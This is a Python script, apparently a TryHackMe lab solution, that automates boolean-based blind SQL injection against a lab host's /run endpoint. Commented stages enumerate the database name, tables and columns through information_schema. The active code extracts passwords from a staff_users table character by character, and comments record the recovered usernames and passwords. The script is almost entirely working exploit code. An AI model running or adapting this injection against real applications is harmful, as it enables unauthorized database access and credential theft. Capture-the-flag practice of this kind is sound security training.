import requests

from prosthemadera.checker import Checker
from prosthemadera.executor import Executor, VariableSet
from prosthemadera.statement import Operator, FormatStmt, variables


class MyChecker(Checker):
    def check_statement(self, statement: str):
        # TryHackMe: Blind SQLi - Boolean Based
        sql = 'select * from article where id = 1 and ' + statement
        r = requests.post('http://10.10.209.143/run', data={
            'level': 1,
            'sql': sql
        })
        result = r.json()

        return result['message'] != 'No Results Found'


if __name__ == '__main__':
    var_set = VariableSet([x for x in range(32, 256)])

    i, var, field = variables(3)
    cmp = Operator(operator='>=')

    # stmt = FormatStmt('length(database()) >= {}', var)
    # stmt2 = FormatStmt('(SELECT ascii(substring(database(), {}, 1))) {} {}', i, cmp, var)
    #  => DATABASE: sqli_one

    # stmt = FormatStmt("(SELECT length(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one' LIMIT 1 OFFSET 1) >= {}", var)
    # stmt2 = FormatStmt("(SELECT ascii(substring(table_name, {}, 1)) FROM information_schema.tables WHERE table_schema = 'sqli_one' LIMIT 1 OFFSET 1) {} {}", i, cmp, var)
    #  => TABLES: article, staff_users

    # stmt = FormatStmt("(SELECT length(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_one' and TABLE_NAME='staff_users' LIMIT 1 OFFSET 2) >= {}", var)
    # stmt2 = FormatStmt("(SELECT ascii(substring(COLUMN_NAME, {}, 1)) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_one' and TABLE_NAME='staff_users' LIMIT 1 OFFSET 2) {} {}", i, cmp, var)
    #  => COLUMNS: id, password, username, ...

    stmt = FormatStmt('(SELECT length(password) FROM staff_users LIMIT 1 OFFSET 1) >= {}', var)
    stmt2 = FormatStmt('(SELECT ascii(substring(password, {}, 1)) FROM staff_users LIMIT 1 OFFSET 1) {} {}', field, cmp, var)

    #  => VALUES:
    #         ?     |  p4ssword
    #       martin  |  pa$$word

    length = Executor(MyChecker(), stmt).get_integer(variable=var)
    print(Executor(MyChecker(), stmt2).get_text(
        length=length,
        index=i,
        comparator=cmp,
        variable=var,
        variable_sets=[var_set]))
